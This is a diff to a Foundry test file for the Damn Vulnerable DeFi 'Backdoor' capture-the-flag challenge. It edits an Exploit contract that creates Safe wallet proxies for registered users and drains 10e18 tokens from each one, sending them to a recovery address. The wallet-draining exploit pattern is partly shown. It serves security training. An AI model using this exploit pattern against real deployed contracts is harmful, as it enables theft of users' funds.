@@ -71,8 +71,7 @@ contract BackdoorChallenge is Test {
      */
     function test_backdoor() public checkSolvedByPlayer {
         Exploit ex = new Exploit(); 
-        ex.attack(users, token, singletonCopy, walletFactory, walletRegistry);
-        token.transfer(recovery, AMOUNT_TOKENS_DISTRIBUTED);
+        ex.attack(users, token, singletonCopy, walletFactory, walletRegistry, recovery);
     }
 
     /**
@@ -98,7 +97,7 @@ contract BackdoorChallenge is Test {
 }
 
 contract Exploit {
-    function attack(address[] memory _users, DamnValuableToken _token, Safe _singletonCopy, SafeProxyFactory _walletFactory, WalletRegistry _walletRegistry) external {
+    function attack(address[] memory _users, DamnValuableToken _token, Safe _singletonCopy, SafeProxyFactory _walletFactory, WalletRegistry _walletRegistry, address recovery) external {
         for (uint256 i = 0; i < _users.length; i++) {
             address[] memory owners = new address[](1);
             owners[0] = _users[i];
@@ -123,7 +122,7 @@ contract Exploit {
                 uint256(0), 
                 _walletRegistry
             ));
-            _token.transferFrom(proxy, msg.sender, 10e18);
+            _token.transferFrom(proxy, recovery, 10e18);
         }
     }
 
